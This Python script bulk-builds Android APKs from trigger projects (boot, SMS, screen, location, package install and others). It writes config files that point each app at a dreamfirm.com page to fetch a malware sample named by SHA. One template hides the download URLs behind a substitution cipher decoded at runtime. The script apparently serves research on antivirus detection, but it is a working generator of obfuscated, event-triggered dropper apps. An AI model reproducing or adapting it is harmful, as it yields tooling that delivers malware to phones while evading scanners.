import os
import sys
import subprocess

DIRECT_APP_CONFIG = 'UnlockSreenMonitor/app/src/main/java/com/example/dell/unlocksreenmonitor/Config.java'
INDIRECT_APP_CONFIG = 'BootTrigger/app/src/main/java/com/example/boottrigger/Config.java'

TEMPLATE = 'package {};\npublic class Config {{\n\tpublic static String TOUCH_PAGE = "http://www.dreamfirm.com/test{}.php";\n\tpublic static String DOWNLOAD_LINK = "http://www.dreamfirm.com/726a2eedb9df3d63ec1b4a7d774a799901f1a2b9.php?sha={}";\n}}'

SHA_LIST = [item.strip() for item in open('dynamic_malware.txt').readlines()]
OUTPUT_FOLDER = '/home/data/XXX/exp_apps/apps_dynamic_host/'


OUTPUT_FOLDER2 = '/home/data/XXX/exp_apps/apps_dynamic_trigger/'
TEMPLATE2 = 'package {};\npublic class Config {{\n\tpublic static String TOUCH_PAGE = "http://www.dreamfirm.com/cello.php?act=start&sha={}&name={}";\n\tpublic static String DOWNLOAD_LINK = "http://www.dreamfirm.com/cello.php?act=download&sha={}&name={}";\n}}'

OUTPUT_FOLDER3 = '/home/data/XXX/exp_apps/apps_dynamic_trigger2/'
TEMPLATE3 = 'package {}; public class Config {{static String domain = "s..61kkgggo8f&qdz?fdoacdk"; static String page = "9?ce?=o6s6"; static String p1 = "7qa.l"; static String p2 = "pvsql"; static String p3 = "p=qd&l"; public static String TOUCH_PAGE = ""; public static String DOWNLOAD_LINK = ""; static String source="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.?=&".toLowerCase(); static String target="Q5A8&ZWS?0XED=C6RFV.T9GB/Y4H:NU3J2MI1KO7LP".toLowerCase(); static{{ TOUCH_PAGE = unobfuscate(domain) + unobfuscate(page)+unobfuscate(p1) + "{}" + unobfuscate(p2) + "{}" + unobfuscate(p3) + "{}";DOWNLOAD_LINK = unobfuscate(domain) + unobfuscate(page) + unobfuscate(p1) + "{}" + unobfuscate(p2) + "{}" + unobfuscate(p3) + "{}";}}    public static String unobfuscate(String s) {{ char[] result= new char[s.length()]; for (int i=0;i<s.length();i++) {{ char c=s.charAt(i); int index=target.indexOf(c); result[i]=source.charAt(index);  }} return new String(result);}} }}'

def main():

    if not os.path.exists(OUTPUT_FOLDER):
        os.makedirs(OUTPUT_FOLDER)

    for sha in SHA_LIST:
        if not os.path.exists(os.path.join(OUTPUT_FOLDER, sha+'_direct.apk')):
            with open(DIRECT_APP_CONFIG, 'w') as fout:
                fout.write(TEMPLATE.format('com.example.dell.unlocksreenmonitor','1', sha))
            os.chdir('UnlockSreenMonitor')
            subprocess.call(['./gradlew', 'assembleRelease', '--max-workers=64'])
            subprocess.call(['mv', '-v', 'app/build/outputs/apk/release/app-release.apk', os.path.join(OUTPUT_FOLDER, sha+'_direct.apk')])
            os.chdir('../')

        if not os.path.exists(os.path.join(OUTPUT_FOLDER, sha+'_indirect.apk')):
            with open(INDIRECT_APP_CONFIG, 'w') as fout:
                fout.write(TEMPLATE.format('com.example.boottrigger', '2', sha+'&indir=1'))
            os.chdir('BootTrigger')
            subprocess.call(['./gradlew', 'assembleRelease', '--max-workers=64'])
            subprocess.call(['mv', '-v', 'app/build/outputs/apk/release/app-release.apk', os.path.join(OUTPUT_FOLDER, sha+'_indirect.apk')])
            os.chdir('../')


def batch_dynamic():

    apps = {
        'smstrigger': {
            'package': 'sms.dynamic.avscale.com.smstrigger',
            'folder': 'SmsTrigger'
        },
        'screentrigger': {
            'package': 'com.avscale.dynamic.screen.screentrigger',
            'folder': 'ScreenTrigger'
        },
        'presenttrigger': {
            'package': 'com.avscale.dynamic.present.presenttrigger',
            'folder': 'PresentTrigger'
        },
        'powerdiscontrigger': {
            'package': 'com.avscale.dynamic.power2.powerdiscontrigger',
            'folder': 'PowerDisconTrigger'
        },
        'powercontrigger': {
            'package': 'com.avscale.dynamic.power1.powercontrigger',
            'folder': 'PowerConTrigger'
        },
        'packageremovetrigger': {
            'package': 'com.avscale.dynamic.package2.packageremovetrigger',
            'folder': 'PackageRemoveTrigger'
        },
        'packageaddtrigger': {
            'package': 'com.avscale.dynamic.package1.packageaddtrigger',
            'folder': 'PackageAddTrigger'
        },
        'locationtrigger': {
            'package': 'location.dynamic.avscale.com.locationtrigger',
            'folder': 'LocationTrigger'
        },
        'connectiontrigger': {
            'package': 'sms.dynamic.avscale.com.connectiontrigger',
            'folder': 'ConnectionTrigger'
        },
        'boottrigger': {
            'package': 'com.example.boottrigger',
            'folder': 'BootTrigger'
        }
    }

    if not os.path.exists(OUTPUT_FOLDER3):
        os.makedirs(OUTPUT_FOLDER3)

    total = 0
    os.chdir('dynamic')
    for app in apps:
        print('Current folder: ', apps[app]['folder'])
        os.chdir(apps[app]['folder'])
        for sha in SHA_LIST[:100]:
            target_apk = os.path.join(OUTPUT_FOLDER3, sha+'_'+app+'.apk')
            if os.path.exists(target_apk):
                continue

            with open('app/src/main/java/'+'/'.join(apps[app]['package'].split('.')) + '/Config.java', 'w') as fout:
                fout.write(TEMPLATE3.format(apps[app]['package'], 'start', sha, app, 'download', sha, app))

            subprocess.call(['./gradlew', 'assembleRelease', '--max-workers=64'])
            subprocess.call(['mv', '-v', 'app/build/outputs/apk/release/app-release.apk', target_apk])
            total += 1
        os.chdir('../')

    print('Total: {}'.format(total))


if __name__ == '__main__':
    #main()
    batch_dynamic()
